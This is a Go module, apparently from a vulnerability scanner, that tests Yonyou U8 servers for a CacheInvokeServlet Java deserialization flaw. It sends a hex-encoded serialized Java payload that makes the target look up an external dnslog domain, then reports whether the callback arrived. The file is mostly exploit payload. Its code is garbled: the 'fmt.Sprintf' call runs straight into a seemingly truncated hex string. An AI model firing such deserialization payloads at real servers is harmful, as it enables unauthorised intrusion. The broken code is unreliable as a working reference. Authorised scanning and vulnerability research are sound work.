package U8_CacheInvokeServlet

import (
	"encoding/hex"
	"fmt"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
	"yongyouScan/pkg/dnslog"
	"yongyouScan/pkg/utils"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	domain, session := dnslog.GetDnslogUrl()
	url = url + "/service/~iufo/com.ufsoft.iufo.web.appletinvoke.CacheInvokeServlet"
	_, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent":     UA,
		"Content-Length": "20327",
		"Content-Type":   "application/x-www-form-urlencoded",
	}).SetBody(fmt.Sprintf("{{unquote(\"%s\")}}", utils.InsertBackslashX(fmt.Sprintfs740006696E766F6B657571007E001B00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B0200007870000000017371007E00003F4000000000000C77080000001000000000787871007E000678", hex.EncodeToString([]byte(domain)))))).Post(url)
	if err != nil {
		color.Red.Println("[-] 用友 U8 CacheInvokeServlet反序列化漏洞不存在")
		return
	}
	if dnslog.GetDnslogRecord(session) {
		color.Green.Println("[+] 用友 U8 CacheInvokeServlet反序列化漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 U8 CacheInvokeServlet反序列化漏洞不存在")
}
